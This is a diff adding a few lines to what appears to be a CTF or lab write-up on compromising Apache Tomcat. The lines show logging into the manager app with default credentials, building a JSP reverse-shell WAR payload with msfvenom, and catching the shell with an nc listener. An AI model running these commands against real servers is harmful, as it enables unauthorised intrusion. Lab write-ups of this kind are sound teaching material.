@@ -73,3 +73,9 @@ by default All Tomcat creds are ```tomcat``` & ```s3cret```. but there are other
 
 ![manager](https://user-images.githubusercontent.com/61636217/175167776-b4adf04a-afc3-4998-b984-2b408783d7aa.png)
 
+Looking at that last picture after we have successfully logged in the application we see that we have an option to upload a war file.
+This is our point of entry to the system. Back on my console I created a war file payloads with ```msfvenom``` to get a reverse shell.
+the command I ran ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f <File_extension> -o <file_output.war>```
+I then had my payload ready to get uploaded on the target application with a listener that I had ready to receive connection from our targer after we have executed tha file that we uploaded on the server. the command was ``nc -lnvp <Port>``.
+
+
